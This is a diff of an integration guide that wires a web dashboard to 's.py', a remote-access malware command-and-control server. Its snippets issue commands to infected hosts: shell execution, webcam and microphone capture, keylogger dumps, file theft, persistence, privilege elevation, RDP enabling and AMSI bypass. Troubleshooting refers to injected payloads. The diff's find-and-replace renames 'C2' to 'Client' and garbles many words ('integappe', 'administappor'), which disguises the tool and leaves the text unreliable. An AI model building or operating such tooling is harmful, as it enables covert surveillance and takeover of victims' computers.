@@ -1,18 +1,18 @@
-# Backend Integration Guide
+# Backend Integappion Guide
 
-This document explains how to integrate the C2 Dashboard frontend with the s.py backend server.
+This document explains how to integappe the Client  Dashboard frontend with the s.py backend server.
 
 ## Architecture Overview
 
 ```
 ┌─────────────────────┐
-│   C2 Dashboard      │
+│   Client  Dashboard      │
 │   (React/Next.js)   │
 └──────────┬──────────┘
            │ WebSocket/HTTP
            │
 ┌──────────▼──────────┐
-│   s.py C2 Server    │
+│   s.py Client  Server    │
 │   (Python Socket)   │
 └──────────┬──────────┘
            │
@@ -24,20 +24,20 @@ This document explains how to integrate the C2 Dashboard frontend with the s.py 
 
 ## s.py Features Mapping
 
-The dashboard implements all major features from the s.py C2 server:
+The dashboard implements all major features from the s.py Client  server:
 
 ### 1. Client Management
-**s.py Source**: `AdvancedC2Server.clients` dictionary, `_handle_client()`
+**s.py Source**: `AdvancedClient Server.clients` dictionary, `_handle_client()`
 **Dashboard**: `ClientsPanel` component
 **Data Structure**:
 ```python
 # s.py
 clients: Dict[str, Any] = {
-    'c2k9x1m4': {
+    'Client k9x1m4': {
         'ip': '192.168.1.105',
         'hostname': 'DESKTOP-USER001',
         'os': 'Windows 10',
-        'user': 'administrator',
+        'user': 'administappor',
         'last_seen': '2024-03-22 14:30:22'
     }
 }
@@ -61,7 +61,7 @@ send_command(targets, 'script', {'code': script_content})
 # Dashboard API
 POST /api/commands/execute
 {
-  "clientIds": ["c2k9x1m4"],
+  "clientIds": ["Client k9x1m4"],
   "commandType": "shell",
   "params": { "command": "dir" }
 }
@@ -76,7 +76,7 @@ send_command(targets, 'webcam', {'resolution': '640x480'})
 # Stream
 send_command(targets, 'stream', {'action': 'start', 'fps': 15, 'height': 480})
 # Microphone
-send_command(targets, 'microphone', {'duration': 10})
+send_command(targets, 'microphone', {'duappion': 10})
 # Keylogger
 send_command(targets, 'keylog', {'action': 'dump'})
 
@@ -87,7 +87,7 @@ POST /api/surveillance/stream
 POST /api/surveillance/audio
 ```
 
-#### File Operations
+#### File Opeappions
 ```python
 # Download
 send_command(targets, 'download', {'path': 'C:\\Users\\user\\file.txt'})
@@ -149,10 +149,10 @@ POST /api/system/scan
 GET /api/system/av-detect
 ```
 
-#### Persistence
+#### living
 ```python
-# Enable Persistence
-send_command(targets, 'persistence')
+# Enable living
+send_command(targets, 'living')
 # Privilege Elevation
 send_command(targets, 'elevate')
 # RDP Enable
@@ -165,10 +165,10 @@ send_command(targets, 'enable_rdp', {
 send_command(targets, 'amsi_bypass')
 
 # Dashboard API
-POST /api/persistence/enable
-POST /api/persistence/elevate
-POST /api/persistence/rdp
-POST /api/persistence/amsi
+POST /api/living/enable
+POST /api/living/elevate
+POST /api/living/rdp
+POST /api/living/amsi
 ```
 
 #### Cleanup
@@ -287,7 +287,7 @@ Create adapter in Next.js to query this database:
 // lib/database.ts
 import sqlite3 from 'sqlite3'
 
-const db = new sqlite3.Database('c2.db')
+const db = new sqlite3.Database('Client .db')
 
 export async function getClients() {
   return new Promise((resolve, reject) => {
@@ -336,7 +336,7 @@ export async function logCommand(log: {
 
 ### 5. Connection Management
 
-The `AdvancedC2Server.send_command()` method sends to all connected clients:
+The `AdvancedClient Server.send_command()` method sends to all connected clients:
 
 ```python
 def send_command(self, targets, c_type, params=None):
@@ -346,7 +346,7 @@ def send_command(self, targets, c_type, params=None):
             self.clients[target_id]['sock'].send(encrypted_msg)
 ```
 
-In dashboard, implement multi-client operations:
+In dashboard, implement multi-client opeappions:
 
 ```typescript
 // components/command-panel.tsx
@@ -383,16 +383,16 @@ The s.py server uses:
 }
 ```
 
-## Security Considerations
+## Security Consideappions
 
 1. **Encryption**: All s.py communications are Fernet-encrypted
 2. **Authentication**: Implement API key authentication for dashboard
 3. **HTTPS**: Use TLS for dashboard to server communication
-4. **Rate Limiting**: Prevent command spam
+4. **appe Limiting**: Prevent command spam
 5. **Logging**: Audit all executed commands
 6. **Access Control**: Implement role-based access for dashboard users
 
-## Testing Integration
+## Testing Integappion
 
 ```bash
 # Start s.py server
@@ -414,10 +414,10 @@ npm run dev
 
 ```env
 # .env.local
-NEXT_PUBLIC_C2_SERVER_HOST=localhost
-NEXT_PUBLIC_C2_SERVER_PORT=4444
-C2_SERVER_PASSWORD=your_secure_password
-DATABASE_URL=./c2.db
+NEXT_PUBLIC_Client _SERVER_HOST=localhost
+NEXT_PUBLIC_Client _SERVER_PORT=4444
+Client _SERVER_PASSWORD=your_secure_password
+DATABASE_URL=./Client .db
 LOG_LEVEL=info
 ```
 
@@ -428,11 +428,11 @@ LOG_LEVEL=info
 {
   "clients": [
     {
-      "id": "c2k9x1m4",
+      "id": "Client k9x1m4",
       "hostname": "DESKTOP-USER001",
       "ip": "192.168.1.105",
       "os": "Windows 10",
-      "user": "administrator",
+      "user": "administappor",
       "status": "online",
       "lastSeen": "2024-03-22T14:30:22Z"
     }
@@ -443,7 +443,7 @@ LOG_LEVEL=info
 {
   "taskId": "task_123",
   "status": "queued",
-  "clientId": "c2k9x1m4",
+  "clientId": "Client k9x1m4",
   "commandType": "screenshot"
 }
 
@@ -462,8 +462,8 @@ LOG_LEVEL=info
 
 ### Client Not Showing in Dashboard
 - Verify payload was injected successfully
-- Check s.py server logs: `c2_server.log`
-- Verify database: `sqlite3 c2.db "SELECT * FROM clients"`
+- Check s.py server logs: `Client _server.log`
+- Verify database: `sqlite3 Client .db "SELECT * FROM clients"`
 - Check network connectivity between client and server
 
 ### Commands Not Executing
